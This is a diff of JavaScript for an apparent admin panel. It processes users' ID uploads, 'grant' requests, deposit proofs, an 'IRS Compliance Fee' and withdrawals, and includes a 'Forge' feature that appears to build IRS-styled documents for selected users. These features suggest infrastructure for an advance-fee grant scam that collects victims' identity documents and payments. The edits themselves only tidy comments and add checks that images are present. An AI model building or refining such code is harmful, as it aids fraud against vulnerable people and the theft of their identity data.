@@ -173,7 +173,6 @@
     onAuthStateChanged(auth, u => { if(u && u.email === ADMIN) sync(); else window.location.href="login.html"; });
 
     function sync() {
-        // High Speed Real-time Sync
         onSnapshot(collection(db, "users"), snap => {
             users = []; let tC = 0; let mC = 0;
             const forgeS = document.getElementById('forge-user'); 
@@ -185,16 +184,15 @@
                     const data = { id: d.id, ...d.data() }; 
                     users.push(data);
                     
-                    // Task Counter
-                    const needsAction = ['PENDING','UNDER_REVIEW','REQUESTED'].includes(data.kycStatus) || 
+                    // Logic: Task only counts if specific conditions are met AND proof exists
+                    const needsAction = (['PENDING','UNDER_REVIEW','REQUESTED'].includes(data.kycStatus) && data.idFront) || 
                                       data.applyStatus === 'PENDING' || 
                                       data.awardStatus === 'PENDING' || 
                                       data.withdrawStatus === 'PENDING' || 
                                       data.depositStatus === 'PENDING' || 
-                                      data.taxStatus === 'PENDING';
+                                      (data.taxStatus === 'PENDING' && data.taxImage);
                     if(needsAction) tC++;
                     
-                    // Message Counter (only unread/user-sent)
                     if(data.chatHistory?.some(m => m.sender === 'USER')) mC++;
                     
                     forgeS.innerHTML += `<option value="${data.id}" ${currentForgeVal === data.id ? 'selected' : ''}>${data.fullName || 'Anonymous'}</option>`;
@@ -208,7 +206,6 @@
             render();
         });
 
-        // Logs Listener
         onSnapshot(query(collection(db, "logs"), orderBy("timestamp", "desc"), limit(50)), snap => {
             const grid = document.getElementById('full-logs'); grid.innerHTML = "";
             snap.forEach(l => {
@@ -234,7 +231,6 @@
             const email = u.email || "No email";
             if(!name.toLowerCase().includes(q) && !email.toLowerCase().includes(q)) return;
 
-            // Render User Card
             uDiv.innerHTML += `
             <div class="glass p-4 border-l-4 ${u.kycStatus === 'SUCCESSFUL' ? 'border-emerald-500' : 'border-slate-700'} relative">
                 <div class="flex justify-between items-start mb-4">
@@ -256,15 +252,18 @@
                 </div>
             </div>`;
 
-            // Tasks Rendering - Targeted Checks
-            if(u.kycStatus === 'PENDING' || u.kycStatus === 'UNDER_REVIEW') tDiv.innerHTML += task(u.id, name, 'ID Verification', [u.idFront, u.idBack], 'kyc', 0);
+            // Logic: Only show verification tasks if images are present (User has submitted)
+            if((u.kycStatus === 'PENDING' || u.kycStatus === 'UNDER_REVIEW') && u.idFront) {
+                tDiv.innerHTML += task(u.id, name, 'ID Verification', [u.idFront, u.idBack], 'kyc', 0);
+            }
             if(u.applyStatus === 'PENDING') tDiv.innerHTML += task(u.id, name, `Grant Request: $${u.requestedAmount}`, null, 'apply', u.requestedAmount);
-            if(u.depositStatus === 'PENDING') tDiv.innerHTML += task(u.id, name, `Deposit Proof: $${u.depositAmount}`, [u.depositProof], 'deposit', u.depositAmount);
-            if(u.taxStatus === 'PENDING') tDiv.innerHTML += task(u.id, name, 'IRS Compliance Fee', [u.taxImage], 'tax', 0);
+            if(u.depositStatus === 'PENDING' && u.depositProof) tDiv.innerHTML += task(u.id, name, `Deposit Proof: $${u.depositAmount}`, [u.depositProof], 'deposit', u.depositAmount);
+            if(u.taxStatus === 'PENDING' && u.taxImage) {
+                tDiv.innerHTML += task(u.id, name, 'IRS Compliance Fee', [u.taxImage], 'tax', 0);
+            }
             if(u.withdrawStatus === 'PENDING') tDiv.innerHTML += task(u.id, name, `Disbursement: $${u.withdrawAmount}`, null, 'withdraw', u.withdrawAmount);
             if(u.awardStatus === 'PENDING') tDiv.innerHTML += task(u.id, name, 'Award Claim Request', null, 'award', 0);
 
-            // Chat Previews
             if(u.chatHistory?.length) {
                 const last = u.chatHistory[u.chatHistory.length-1];
                 const unread = last.sender === 'USER';
@@ -286,7 +285,6 @@
         });
     }
 
-    // Task Processing (The Fix for Balance Wiping)
     window.processTask = async (uid, type, status, amt) => {
         let note = "";
         if(status === 'FAILED') {
@@ -296,23 +294,15 @@
 
         const ref = doc(db, "users", uid);
         const updateData = {};
-        
-        // Use specific field names to match User Pages
         updateData[`${type}Status`] = status;
         if(note) updateData[`${type}Note`] = note;
 
-        // Balance Math Logic
         if(status === 'SUCCESSFUL') {
             if(type === 'apply' || type === 'deposit') {
                 updateData.balance = increment(Number(amt));
             }
-            if(type === 'withdraw') {
-                // Balance was already deducted when user clicked send
-                // We just mark it as successful.
-            }
         } else if (status === 'FAILED') {
             if(type === 'withdraw') {
-                // Refund the amount to balance if withdrawal is rejected
                 updateData.balance = increment(Number(amt));
             }
         }
@@ -324,9 +314,7 @@
                 action: `${status}: ${type.toUpperCase()} ($${amt})`, 
                 timestamp: new Date().toISOString() 
             });
-        } catch (e) {
-            alert("Error processing: " + e.message);
-        }
+        } catch (e) { alert("Error: " + e.message); }
     };
 
     window.fund = async (uid) => {
@@ -339,7 +327,7 @@
     };
 
     window.deleteUser = async (uid, name) => {
-        if(confirm(`WARNING: Are you sure you want to PERMANENTLY DELETE ${name}? This cannot be undone.`)) {
+        if(confirm(`WARNING: Are you sure you want to PERMANENTLY DELETE ${name}?`)) {
             await deleteDoc(doc(db, "users", uid));
             await addDoc(collection(db, "logs"), { targetUser: name, action: "PERMANENT DELETION", timestamp: new Date().toISOString() });
         }
@@ -350,7 +338,6 @@
         await updateDoc(doc(db, "users", uid), { kycStatus: next });
     };
 
-    // Forge Logic
     window.previewIRS = () => {
         const uid = document.getElementById('forge-user').value;
         const type = document.getElementById('forge-type').value;
@@ -389,7 +376,14 @@
     };
 
     function task(uid, name, title, imgs, type, amt) {
-        let gallery = imgs ? `<div class="flex gap-2 my-3">` + imgs.map(i => i ? `<img src="${i}" class="w-16 h-16 object-cover rounded-xl border border-white/10 shadow-lg" onclick="pop('${i}')">` : '').join('') + `</div>` : '';
+        // Updated logic to ensure images from database show correctly
+        let gallery = '';
+        if (imgs && imgs.length > 0) {
+            gallery = `<div class="flex gap-2 my-3">` + 
+                imgs.filter(i => i && i !== '').map(i => `<img src="${i}" class="w-16 h-16 object-cover rounded-xl border border-white/10 shadow-lg" onclick="pop('${i}')">`).join('') + 
+                `</div>`;
+        }
+        
         return `
         <div class="glass p-5 border-l-4 border-amber-500 shadow-xl animate-fadeIn">
             <h4 class="font-black text-white text-[11px] uppercase tracking-tighter">${name}</h4>
@@ -405,7 +399,6 @@
         </div>`;
     }
 
-    // Chat Functions
     window.openChat = (uid, name) => {
         tid = uid; document.getElementById('chat-user').innerText = name; document.getElementById('chat-box').classList.remove('hidden');
         onSnapshot(doc(db, "users", uid), s => {
